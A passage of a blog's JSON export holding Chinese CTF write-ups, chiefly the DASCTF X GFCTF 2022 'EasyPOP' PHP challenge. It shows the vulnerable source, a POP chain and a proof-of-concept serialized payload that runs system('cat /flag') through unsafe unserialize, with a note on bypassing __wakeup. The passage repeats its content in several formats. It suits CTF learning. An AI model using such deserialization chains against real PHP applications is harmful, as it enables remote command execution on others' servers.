Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;小甜甜&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">//  &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;小甜甜&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">// O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>"},{"title":"DASCTF X GFCTF 2022十月挑战赛","date":"2022-11-02T14:17:22.000Z","excerpt":"DASCTF X GFCTF 2022十月挑战赛","_content":"\n\n\n# DASCTF X GFCTF 2022十月挑战赛！\n\n## \n\n## WEB\n\n\n\n### 1.EasyPOP\n\n源码：\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass fine\n{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n\n    public function __invoke()\n    {\n        call_user_func($this->cmd, $this->content);\n    }\n\n    public function __wakeup()\n    {\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou's secret-code! Really nice\");\n    }\n}\n\nclass show\n{\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n    public function __construct($ctf)\n    {\n        $this->ctf = $ctf;\n    }\n\n\n    public function __toString()\n    {\n        return $this->ctf->show();\n    }\n\n    public function show(): string\n    {\n        return $this->ctf . \": Duration of practice: \" . $this->time;\n    }\n\n\n}\n\nclass sorry\n{\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n\n    public function __construct($name, $password)\n    {\n        $this->name = $name;\n        $this->password = $password;\n    }\n\n    public function __sleep()\n    {\n        $this->hint = new secret_code();\n    }\n\n    public function __get($name)\n    {\n        $name = $this->key;\n        $name();\n    }\n\n\n    public function __destruct()\n    {\n        if ($this->password == $this->name) {\n\n            echo $this->hint;\n        } else if ($this->name = \"jay\") {\n            secret_code::secret();\n        } else {\n            echo \"This is our code\";\n        }\n    }\n\n\n    public function getPassword()\n    {\n        return $this->password;\n    }\n\n    public function setPassword($password): void\n    {\n        $this->password = $password;\n    }\n\n\n}\n\nclass secret_code\n{\n    protected $code;\n\n    public static function secret()\n    {\n        include_once \"hint.php\";\n        hint();\n    }\n\n    public function __call($name, $arguments)\n    {\n        $num = $name;\n        $this->$num();\n    }\n\n    private function show()\n    {\n        return $this->code->secret;\n    }\n}\n\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n    $a->setPassword(md5(mt_rand()));\n} else {\n    $a = new show(\"Ctfer\");\n    echo $a->show();\n}\nCtfer: Duration of practice: Two and a half years\n```\n\n最终利用点是`fine::invoke`\n\n`$a = unserialize($_GET['pop']);`这里告诉我们是**反序列化**的题目，构造**pop链**\n\n\n\n```\nfine::__invoke() <- sorry::__get() <- secret_code::show() <- secret_code::__call() <- show::__toString() <- sorry::__destruct() \n\n```\n\n\n\n\n\n**poc**\n\n```\n<?php\nclass fine\n{\n    public $cmd;\n    public $content;\n}\nclass secret_code\n{\n    public $code;\n}\n\nclass show\n{\n    public $ctf;\n    public $time;\n}\n\n\nclass sorry\n{\n    public $name;\n    public $password;\n    public $hint;\n    public $key;\n}\n\n$sorry = new sorry();\n$sorry2 = new sorry();\n$show = new show();\n$secret_code = new secret_code();\n$fine = new fine();\n$sorry->hint = $show;\n$show->ctf = $secret_code;\n$secret_code->code = $sorry2;\n$sorry2->key = $fine;\n$fine->cmd = 'system';\n$fine->content = 'cat /flag';\necho serialize($sorry);\n?>\n//绕过wakeup\n//?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";N;s:3:\"key\";O:4:\"fine\":3:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}}}s:4:\"time\";N;}s:3:\"key\";N;}\n\n```","source":"_posts/DASCTF X GFCTF 2022十月挑战赛！.md","raw":"---\ntitle: DASCTF X GFCTF 2022十月挑战赛\ndate: 2022-11-02 22:17:22\nexcerpt: DASCTF X GFCTF 2022十月挑战赛\ncategories: 复现\n---\n\n\n\n# DASCTF X GFCTF 2022十月挑战赛！\n\n## \n\n## WEB\n\n\n\n### 1.EasyPOP\n\n源码：\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass fine\n{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n\n    public function __invoke()\n    {\n        call_user_func($this->cmd, $this->content);\n    }\n\n    public function __wakeup()\n    {\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou's secret-code! Really nice\");\n    }\n}\n\nclass show\n{\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n    public function __construct($ctf)\n    {\n        $this->ctf = $ctf;\n    }\n\n\n    public function __toString()\n    {\n        return $this->ctf->show();\n    }\n\n    public function show(): string\n    {\n        return $this->ctf . \": Duration of practice: \" . $this->time;\n    }\n\n\n}\n\nclass sorry\n{\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n\n    public function __construct($name, $password)\n    {\n        $this->name = $name;\n        $this->password = $password;\n    }\n\n    public function __sleep()\n    {\n        $this->hint = new secret_code();\n    }\n\n    public function __get($name)\n    {\n        $name = $this->key;\n        $name();\n    }\n\n\n    public function __destruct()\n    {\n        if ($this->password == $this->name) {\n\n            echo $this->hint;\n        } else if ($this->name = \"jay\") {\n            secret_code::secret();\n        } else {\n            echo \"This is our code\";\n        }\n    }\n\n\n    public function getPassword()\n    {\n        return $this->password;\n    }\n\n    public function setPassword($password): void\n    {\n        $this->password = $password;\n    }\n\n\n}\n\nclass secret_code\n{\n    protected $code;\n\n    public static function secret()\n    {\n        include_once \"hint.php\";\n        hint();\n    }\n\n    public function __call($name, $arguments)\n    {\n        $num = $name;\n        $this->$num();\n    }\n\n    private function show()\n    {\n        return $this->code->secret;\n    }\n}\n\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n    $a->setPassword(md5(mt_rand()));\n} else {\n    $a = new show(\"Ctfer\");\n    echo $a->show();\n}\nCtfer: Duration of practice: Two and a half years\n```\n\n最终利用点是`fine::invoke`\n\n`$a = unserialize($_GET['pop']);`这里告诉我们是**反序列化**的题目，构造**pop链**\n\n\n\n```\nfine::__invoke() <- sorry::__get() <- secret_code::show() <- secret_code::__call() <- show::__toString() <- sorry::__destruct() \n\n```\n\n\n\n\n\n**poc**\n\n```\n<?php\nclass fine\n{\n    public $cmd;\n    public $content;\n}\nclass secret_code\n{\n    public $code;\n}\n\nclass show\n{\n    public $ctf;\n    public $time;\n}\n\n\nclass sorry\n{\n    public $name;\n    public $password;\n    public $hint;\n    public $key;\n}\n\n$sorry = new sorry();\n$sorry2 = new sorry();\n$show = new show();\n$secret_code = new secret_code();\n$fine = new fine();\n$sorry->hint = $show;\n$show->ctf = $secret_code;\n$secret_code->code = $sorry2;\n$sorry2->key = $fine;\n$fine->cmd = 'system';\n$fine->content = 'cat /flag';\necho serialize($sorry);\n?>\n//绕过wakeup\n//?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";N;s:3:\"key\";O:4:\"fine\":3:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}}}s:4:\"time\";N;}s:3:\"key\";N;}\n\n```","slug":"DASCTF X GFCTF 2022十月挑战赛！","published":1,"updated":"2024-04-17T08:42:59.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7hs0001h7768cbd86nu","content":"<h1 id=\"DASCTF-X-GFCTF-2022十月挑战赛！\"><a href=\"#DASCTF-X-GFCTF-2022十月挑战赛！\" class=\"headerlink\" title=\"DASCTF X GFCTF 2022十月挑战赛！\"></a>DASCTF X GFCTF 2022十月挑战赛！</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"1-EasyPOP\"><a href=\"#1-EasyPOP\" class=\"headerlink\" title=\"1.EasyPOP\"></a>1.EasyPOP</h3><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span>, <span class=\"variable\">$content</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;cmd, <span class=\"variable\">$this</span>-&gt;content);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">&quot;Two and a half years&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$ctf</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ctf = <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf . <span class=\"string\">&quot;: Duration of practice: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;time;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">&quot;hint is depend on you&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;hint = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;key;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password == <span class=\"variable language_\">$this</span>-&gt;name) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;hint;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;jay&quot;</span>) &#123;</span><br><span class=\"line\">            secret_code::<span class=\"title function_ invoke__\">secret</span>();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;This is our code&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPassword</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setPassword</span>(<span class=\"params\"><span class=\"variable\">$password</span></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">secret</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include_once</span> <span class=\"string\">&quot;hint.php&quot;</span>;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">hint</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$num</span> = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$num</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;code-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">setPassword</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>(<span class=\"string\">&quot;Ctfer&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Ctfer: Duration of practice: Two <span class=\"keyword\">and</span> a half years</span><br></pre></td></tr></table></figure>\n\n<p>最终利用点是<code>fine::invoke</code></p>\n<p><code>$a = unserialize($_GET[&#39;pop&#39;]);</code>这里告诉我们是<strong>反序列化</strong>的题目，构造<strong>pop链</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fine::__invoke() &lt;- sorry::__get() &lt;- secret_code::show() &lt;- secret_code::__call() &lt;- show::__toString() &lt;- sorry::__destruct() </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>poc</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class fine</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $cmd;</span><br><span class=\"line\">    public $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class secret_code</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $code;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class show</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $ctf;</span><br><span class=\"line\">    public $time;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class sorry</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    public $password;</span><br><span class=\"line\">    public $hint;</span><br><span class=\"line\">    public $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$sorry = new sorry();</span><br><span class=\"line\">$sorry2 = new sorry();</span><br><span class=\"line\">$show = new show();</span><br><span class=\"line\">$secret_code = new secret_code();</span><br><span class=\"line\">$fine = new fine();</span><br><span class=\"line\">$sorry-&gt;hint = $show;</span><br><span class=\"line\">$show-&gt;ctf = $secret_code;</span><br><span class=\"line\">$secret_code-&gt;code = $sorry2;</span><br><span class=\"line\">$sorry2-&gt;key = $fine;</span><br><span class=\"line\">$fine-&gt;cmd = &#x27;system&#x27;;</span><br><span class=\"line\">$fine-&gt;content = &#x27;cat /flag&#x27;;</span><br><span class=\"line\">echo serialize($sorry);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//绕过wakeup</span><br><span class=\"line\">//?pop=O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;O:4:&quot;show&quot;:2:&#123;s:3:&quot;ctf&quot;;O:11:&quot;secret_code&quot;:1:&#123;s:4:&quot;code&quot;;O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;N;s:3:&quot;key&quot;;O:4:&quot;fine&quot;:3:&#123;s:3:&quot;cmd&quot;;s:6:&quot;system&quot;;s:7:&quot;content&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;s:4:&quot;time&quot;;N;&#125;s:3:&quot;key&quot;;N;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid 